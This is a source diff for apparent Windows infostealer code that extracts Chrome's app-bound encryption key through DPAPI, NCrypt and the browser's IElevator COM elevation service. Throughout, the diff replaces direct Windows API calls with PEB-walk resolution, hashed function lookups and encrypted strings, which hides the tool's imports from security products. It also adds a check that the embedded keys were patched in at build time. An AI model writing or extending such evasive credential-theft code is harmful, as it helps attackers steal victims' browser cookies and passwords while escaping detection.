@@ -21,6 +21,13 @@
 #include "chrome_crypto.h"
 #include "utils/base64.h"
 #include "secure_zero.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
+#include "bcrypt_peb.h"
+#include "crypt32_peb.h"
+#include "com_peb.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -157,6 +164,12 @@ static const unsigned char FLAG1_KEY[32]      __attribute__((used)) = {0};
 static const unsigned char FLAG2_KEY[32]      __attribute__((used)) = {0};
 static const unsigned char FLAG3_XOR_KEY[32]  __attribute__((used)) = {0};
 
+/* Runtime guard — keys must be patched at build time */
+static int keys_are_zero(const unsigned char *k, size_t len) {
+    for (size_t i = 0; i < len; i++) if (k[i]) return 0;
+    return 1;
+}
+
 /* ── NCrypt function pointers (lazy-loaded) ────────────────────── */
 
 /* Use ncrypt.h types — they define NCRYPT_HANDLE as ULONG_PTR */
@@ -174,22 +187,120 @@ static PFN_NCryptOpenKey             g_NCryptOpenKey = NULL;
 static PFN_NCryptDecrypt             g_NCryptDecrypt = NULL;
 static PFN_NCryptFreeObject          g_NCryptFreeObject = NULL;
 
+/* PEB-walk: resolve LoadLibraryA + GetProcAddress from kernel32, then
+   use them to load ncrypt.dll via encrypted strings. */
+typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+
 static int ensure_ncrypt(void) {
     if (g_ncrypt_dll) return 1;
-    g_ncrypt_dll = LoadLibraryA("ncrypt.dll");
+
+    /* Resolve kernel32 via PEB-walk */
+    char k32_name[32];
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32_name);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(k32_name));
+    if (!k32) return 0;
+
+    /* Resolve LoadLibraryA and GetProcAddress via PEB-walk */
+    char fn[32];
+    enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, fn);
+    pLoadLibraryA fnLoadLibraryA = (pLoadLibraryA)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetProcAddress, ENC_GETPROCADDRESS_LEN, fn);
+    pGetProcAddress fnGetProcAddress = (pGetProcAddress)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func(fn));
+    if (!fnLoadLibraryA || !fnGetProcAddress) return 0;
+
+    /* Load ncrypt.dll via encrypted string */
+    char ncrypt_name[32];
+    enc_decrypt(enc_ncrypt, ENC_NCRYPT_LEN, ncrypt_name);
+    g_ncrypt_dll = fnLoadLibraryA(ncrypt_name);
     if (!g_ncrypt_dll) return 0;
+
+    char nfn[32];
+    enc_decrypt(enc_NCryptOpenStorageProvider, ENC_NCRYPTOPENSTORAGEPROVIDER_LEN, nfn);
     g_NCryptOpenStorageProvider = (PFN_NCryptOpenStorageProvider)
-        GetProcAddress(g_ncrypt_dll, "NCryptOpenStorageProvider");
+        fnGetProcAddress(g_ncrypt_dll, nfn);
+    enc_decrypt(enc_NCryptOpenKey, ENC_NCRYPTOPENKEY_LEN, nfn);
     g_NCryptOpenKey = (PFN_NCryptOpenKey)
-        GetProcAddress(g_ncrypt_dll, "NCryptOpenKey");
+        fnGetProcAddress(g_ncrypt_dll, nfn);
+    enc_decrypt(enc_NCryptDecrypt, ENC_NCRYPTDECRYPT_LEN, nfn);
     g_NCryptDecrypt = (PFN_NCryptDecrypt)
-        GetProcAddress(g_ncrypt_dll, "NCryptDecrypt");
+        fnGetProcAddress(g_ncrypt_dll, nfn);
+    enc_decrypt(enc_NCryptFreeObject, ENC_NCRYPTFREEOBJECT_LEN, nfn);
     g_NCryptFreeObject = (PFN_NCryptFreeObject)
-        GetProcAddress(g_ncrypt_dll, "NCryptFreeObject");
+        fnGetProcAddress(g_ncrypt_dll, nfn);
     if (!g_NCryptOpenStorageProvider || !g_NCryptOpenKey ||
         !g_NCryptDecrypt || !g_NCryptFreeObject) {
         return 0;
     }
+    return 1;
+}
+
+/* ── GetLastError (PEB-walked from kernel32) ────────────────────── */
+
+typedef DWORD (WINAPI *pGetLastError_fn)(void);
+static struct { pGetLastError_fn pGLE; int ready; } g_gle_api;
+
+static int ensure_gle(void) {
+    if (g_gle_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_GetLastError, ENC_GETLASTERROR_LEN, fn);
+    g_gle_api.pGLE = (pGetLastError_fn)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func(fn));
+    if (!g_gle_api.pGLE) return 0;
+    g_gle_api.ready = 1;
+    return 1;
+}
+
+/* ── PEB-walk LocalFree (kernel32) ──────────────────────────── */
+
+typedef HLOCAL (WINAPI *pLocalFree)(HLOCAL);
+static struct { pLocalFree pLF; int ready; } g_lf_api;
+
+static int ensure_lf(void) {
+    if (g_lf_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_LocalFree, ENC_LOCALFREE_LEN, fn);
+    g_lf_api.pLF = (pLocalFree)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_lf_api.pLF) return 0;
+    g_lf_api.ready = 1;
+    return 1;
+}
+
+/* ── PEB-walk oleaut32 Sys* functions ──────────────────────────── */
+
+typedef BSTR (WINAPI *pSysAllocStringByteLen)(const char *, UINT);
+typedef void (WINAPI *pSysFreeString)(BSTR);
+typedef UINT (WINAPI *pSysStringByteLen)(BSTR);
+
+static struct {
+    pSysAllocStringByteLen pSASBL;
+    pSysFreeString         pSFS;
+    pSysStringByteLen      pSSBL;
+    int                    ready;
+} g_oa_api;
+
+static int ensure_oa(void) {
+    if (g_oa_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_oleaut32, ENC_OLEAUT32_LEN, dll);
+    void *oa = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!oa) return 0;
+    char fn[32];
+    enc_decrypt(enc_SysAllocStringByteLen, ENC_SYSALLOCSTRINGBYTELEN_LEN, fn);
+    g_oa_api.pSASBL = (pSysAllocStringByteLen)mirage_get_function_by_hash(oa, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_SysFreeString, ENC_SYSFREESTRING_LEN, fn);
+    g_oa_api.pSFS = (pSysFreeString)mirage_get_function_by_hash(oa, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_SysStringByteLen, ENC_SYSSTRINGBYTELEN_LEN, fn);
+    g_oa_api.pSSBL = (pSysStringByteLen)mirage_get_function_by_hash(oa, mirage_encrypted_hash_func(fn));
+    if (!g_oa_api.pSASBL || !g_oa_api.pSFS || !g_oa_api.pSSBL) return 0;
+    g_oa_api.ready = 1;
     return 1;
 }
 
@@ -244,17 +355,20 @@ static int aes_gcm_decrypt_256(const unsigned char *key32,
                                 const unsigned char *ciphertext, size_t ct_len,
                                 const unsigned char *tag, size_t tag_len,
                                 unsigned char *out, size_t out_max, size_t *out_len) {
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
+
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     NTSTATUS status;
 
-    status = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_AES_GCM_ALGORITHM, NULL, 0);
+    status = bc->pOpen(&hAlgo, BCRYPT_AES_GCM_ALGORITHM, NULL, 0);
     if (status < 0) return -1;
 
-    status = BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE,
+    status = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
                                (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-    if (status < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    if (status < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     BCRYPT_KEY_DATA_BLOB_HEADER keyBlob;
     keyBlob.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
@@ -263,14 +377,14 @@ static int aes_gcm_decrypt_256(const unsigned char *key32,
 
     size_t blob_size = sizeof(keyBlob) + 32;
     unsigned char *blob = (unsigned char *)malloc(blob_size);
-    if (!blob) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    if (!blob) { bc->pClose(hAlgo, 0); return -1; }
     memcpy(blob, &keyBlob, sizeof(keyBlob));
     memcpy(blob + sizeof(keyBlob), key32, 32);
 
-    status = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
+    status = bc->pGenKey(hAlgo, &hKey, NULL, 0,
                                          blob, (ULONG)blob_size, 0);
     free(blob);
-    if (status < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    if (status < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
@@ -280,12 +394,12 @@ static int aes_gcm_decrypt_256(const unsigned char *key32,
     authInfo.cbTag = (ULONG)tag_len;
 
     ULONG resultLen = 0;
-    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)ct_len,
+    status = bc->pDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)ct_len,
                             &authInfo, NULL, 0, out, (ULONG)out_max,
                             &resultLen, 0);
 
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    bc->pDestroyKey(hKey);
+    bc->pClose(hAlgo, 0);
 
     if (status < 0) return -1;
     *out_len = (size_t)resultLen;
@@ -374,9 +488,9 @@ int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
     input.pbData = (BYTE *)(dpapi_blob + 1);
     memset(&output, 0, sizeof(output));
 
-    if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
-        DWORD err = GetLastError();
-        dbg_printf("[!] CryptUnprotectData failed: %lu\n", err);
+    if (!mirage_crypt32_api() || !mirage_crypt32_api()->pUnprotect(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+        if (ensure_gle()) (void)g_gle_api.pGLE();
+        dbg_printf("[!] CryptUnprotectData failed\n");
         return -1;
     }
 
@@ -385,7 +499,7 @@ int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
     memcpy(out, output.pbData, copy);
     *out_len = copy;
     mirage_secure_zero(output.pbData, output.cbData);
-    LocalFree(output.pbData);
+    { if (ensure_lf()) g_lf_api.pLF(output.pbData); };
     return 0;
 }
 
@@ -397,6 +511,9 @@ int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
  */
 static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len,
                                    unsigned char *key32) {
+    if (keys_are_zero(FLAG1_KEY, 32) && keys_are_zero(FLAG2_KEY, 32) && keys_are_zero(FLAG3_XOR_KEY, 32))
+        return -1; /* keys not patched */
+
     if (dec_len < 8) return -1;
 
     size_t pos = 0;
@@ -420,7 +537,7 @@ static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len
     if (val == 32) {
         if (pos + 32 > dec_len) return -1;
         memcpy(key32, decrypted + pos, 32);
-        mirage_secure_zero(decrypted, dec_len);
+        mirage_secure_zero((void*)decrypted, dec_len);
 
         return 0;
     }
@@ -531,7 +648,8 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     const ElevatorGuids *guids = get_guids(browser);
 
     /* Initialize COM */
-    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (!mirage_com_api()) return -1;
+    HRESULT hr = mirage_com_api()->pInit(NULL, COINIT_APARTMENTTHREADED);
     if (hr < 0) {
         dbg_printf("[!] CoInitializeEx failed: 0x%lx\n", (unsigned long)hr);
         return -1;
@@ -539,16 +657,16 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
 
     /* Create IElevator instance */
     IUnknown *elevator = NULL;
-    hr = CoCreateInstance(&guids->clsid, NULL, CLSCTX_LOCAL_SERVER,
+    hr = mirage_com_api()->pCreate(&guids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                            &guids->iid_v1, (void **)&elevator);
     if (hr < 0 || !elevator) {
         dbg_printf("[!] CoCreateInstance failed: 0x%lx\n", (unsigned long)hr);
-        CoUninitialize();
+        mirage_com_api()->pUninit();
         return -1;
     }
 
     /* Set proxy blanket for authentication */
-    hr = CoSetProxyBlanket((IUnknown *)elevator,
+    hr = mirage_com_api()->pBlanket((IUnknown *)elevator,
                             RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                             NULL,
                             RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
@@ -558,7 +676,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     if (hr < 0) {
         dbg_printf("[!] CoSetProxyBlanket failed: 0x%lx\n", (unsigned long)hr);
         elevator->lpVtbl->Release(elevator);
-        CoUninitialize();
+        mirage_com_api()->pUninit();
         return -1;
     }
 
@@ -574,10 +692,11 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     }
 
     /* Convert payload to BSTR for COM call */
-    BSTR bstr_payload = SysAllocStringByteLen((const char *)payload, (UINT)payload_len);
+    if (!ensure_oa()) { elevator->lpVtbl->Release(elevator); mirage_com_api()->pUninit(); return -1; }
+    BSTR bstr_payload = g_oa_api.pSASBL((const char *)payload, (UINT)payload_len);
     if (!bstr_payload) {
         elevator->lpVtbl->Release(elevator);
-        CoUninitialize();
+        mirage_com_api()->pUninit();
         return -1;
     }
 
@@ -585,30 +704,30 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     wchar_t *plaintext_bstr = NULL;
     ULONG last_error = 0;
     hr = vtbl->DecryptData(elevator, bstr_payload, &plaintext_bstr, &last_error);
-    SysFreeString(bstr_payload);
+    g_oa_api.pSFS(bstr_payload);
 
     if (hr < 0 || !plaintext_bstr) {
         dbg_printf("[!] IElevator::DecryptData failed: hr=0x%lx err=%lu\n",
                (unsigned long)hr, (unsigned long)last_error);
         elevator->lpVtbl->Release(elevator);
-        CoUninitialize();
+        mirage_com_api()->pUninit();
         return -1;
     }
 
     /* Extract 32-byte key from BSTR */
-    UINT byte_len = SysStringByteLen(plaintext_bstr);
+    UINT byte_len = g_oa_api.pSSBL(plaintext_bstr);
     if (byte_len < 32) {
         dbg_printf("[!] IElevator returned short key: %u bytes\n", byte_len);
-        SysFreeString(plaintext_bstr);
+        g_oa_api.pSFS(plaintext_bstr);
         elevator->lpVtbl->Release(elevator);
-        CoUninitialize();
+        mirage_com_api()->pUninit();
         return -1;
     }
 
     memcpy(key32, plaintext_bstr, 32);
-    SysFreeString(plaintext_bstr);
+    g_oa_api.pSFS(plaintext_bstr);
     elevator->lpVtbl->Release(elevator);
-    CoUninitialize();
+    mirage_com_api()->pUninit();
 
     
     return 0;
